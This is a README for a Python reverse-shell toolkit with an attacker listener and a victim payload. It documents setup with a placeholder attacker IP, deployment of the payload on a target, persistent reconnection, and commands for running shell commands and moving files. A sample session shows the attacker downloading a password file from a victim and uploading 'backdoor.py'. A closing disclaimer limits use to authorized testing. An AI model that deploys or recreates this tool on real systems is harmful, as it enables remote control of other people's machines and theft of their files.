
# 🚀 Advanced Python Reverse Shell

This **advanced version** of the Python reverse shell is a powerful upgrade over the basic version, designed with reliability, extended capabilities, and operational stealth in mind. It maintains the simplicity of Python while introducing features critical for realistic penetration testing and red teaming exercises.

Unlike the basic version, which provides core command execution and a linear connection, this advanced version ensures persistent communication, intelligent command handling, and secure file transfers — making it a practical tool for ethical hackers.

---

## 🆚 Basic vs Advanced: What's New?

| Feature                      | Basic Version                    | Advanced Version                                                      |
| ---------------------------- | ------------------------------- | ------------------------------------------------------------------- |
| Persistent Reconnect          | ❌ Single connection attempt     | ✅ Reconnects every 5 seconds if listener is offline                |
| File Download                | ❌ Not supported                 | ✅ Supported with pattern-based listing and exact match download    |
| File Upload                  | ❌ Not supported                 | ✅ Send files from hacker to victim with integrity checks           |
| Directory Navigation (`cd`)   | ✅ Supported                    | ✅ Improved, supports path echoing and default display              |
| Command Output Handling       | ⚠️ Plaintext with limited fallback | ✅ Cross-platform decoding with `cp437` (Windows) and `utf-8` fallback |
| Empty Command Output Handling | ❌ No feedback                  | ✅ "No output" feedback when silent commands are run                |
| Graceful Exit (`stop`)        | ✅ Supported                   | ✅ Improved clean disconnection and shutdown                        |
| Socket Reuse (SO_REUSEADDR)  | ❌ Not handled                 | ✅ Enables quick listener restarts without port binding errors      |

---

## 📁 Directory Contents

```

Advanced-Version/
├── README.md                # You are here
├── advanced\_hacker.py       # Attacker script (listener and controller)
└── advanced\_victim.py       # Victim payload (persistent reverse shell)

````

---

## 💡 Core Features

* **🔁 Reconnection Loop**: Victim automatically retries connecting to hacker every 5 seconds if disconnected.
* **💻 Command Execution**: Cross-platform shell support (PowerShell, cmd, bash). Uses `subprocess.run` with output decoding.
* **📂 `cd` Support**: Allows directory changes with confirmation, or just shows current directory if used alone.
* **📥 File Download**:
  * Request exact file or pattern (e.g., `report` lists `report.txt`, `report.pdf`, etc.).
  * Select from matches for precise download.
* **📤 File Upload**:
  * Send files from hacker to victim securely.
  * Hacker verifies file exists and is non-empty before sending.
* **🛑 Graceful Termination**: The `stop` command cleanly shuts down both scripts.
* **📡 Port Reuse**: Hacker script uses `SO_REUSEADDR` to allow instant port reuse after closure.
* **⚙️ Robust File Protocol**:
  * All file transfers are in binary.
  * Transfers begin with an 8-byte size header.
  * Size `0` signals "not found", "empty", or "canceled" conditions.

---

## 🚀 Usage Guide

### 🔧 1. Configure IP and Port

Edit both scripts and set:

```python
hacker_ip = "YOUR_ATTACKER_IP"
hacker_port = 10000
````

Ensure both use the same values. On attacker machine, use `ip a` (Linux) or `ipconfig` (Windows) to find your IP.

---

### 🧠 2. Start Listener (Hacker)

```bash
python3 advanced_hacker.py
```

Wait for incoming connections.

---

### 👾 3. Deploy Victim Script

On the target (victim) machine:

```bash
python3 advanced_victim.py
```

It will continuously retry until the hacker connects.

---

## 💬 Commands You Can Use

| Command                     | Description                                  |
| --------------------------- | -------------------------------------------- |
| `cd`                        | Show current directory                       |
| `cd <path>`                 | Change directory                             |
| `download <file or prefix>` | Download file (or match pattern) from victim |
| `upload <filename>`         | Upload file from hacker to victim            |
| `stop`                      | Cleanly terminate the session                |
| *any other command*         | Executed as shell command on victim          |

---

## 📌 Sample Session

**Attacker:**

```bash
python3 advanced_hacker.py
Listening for incoming connections...
[+] Connected with ('192.168.0.105', 50832)
> whoami
victim-pc\user

> cd Desktop
Changed directory to Desktop

> download pass
All files with (pass) name:
  [+] pass.txt
  [+] pass_list.docx
Type exact file name:
> download pass_list.docx
Yes, the file exists!
Receiving file (38290 bytes)...
File downloaded successfully!

> upload backdoor.py
File uploaded successfully!

> stop
[*] Session terminated. Exiting.
```

**Victim Output (optional, not shown to attacker):**

```
[*] Connected to hacker.
whoami is executed successfully!
cd Desktop is executed successfully!
download pass is executed successfully!
download pass_list.docx is executed successfully!
upload backdoor.py is executed successfully!
stop is executed successfully!
```

---

## 🧪 Advanced Internals

### 🔄 Persistent Reconnect

Victim attempts reconnection every 5 seconds. This is ideal when listener crashes or is temporarily offline.

### 📜 Command Dispatch

Victim classifies and handles:

* `cd`
* `download`
* `upload`
* `stop`
* Any other command → routed to shell via `subprocess.run()`

### 📁 File Transfer Protocol

* 8-byte length header sent before file data.
* Chunked send/receive.
* Zero-length used for signaling "not found" or "empty".

### 🧬 Encoding Fallback

* Windows: `cp437`
* Linux/macOS: `utf-8`
* Always fallback to `errors="replace"` to avoid crashes from malformed characters.

---

## ⚠️ Legal Disclaimer

This tool is intended **solely for educational use** and authorized ethical hacking engagements. Unauthorized access or usage of this tool on systems you do not own or have explicit permission to test is illegal. The author assumes no responsibility for any misuse or consequences thereof.

---
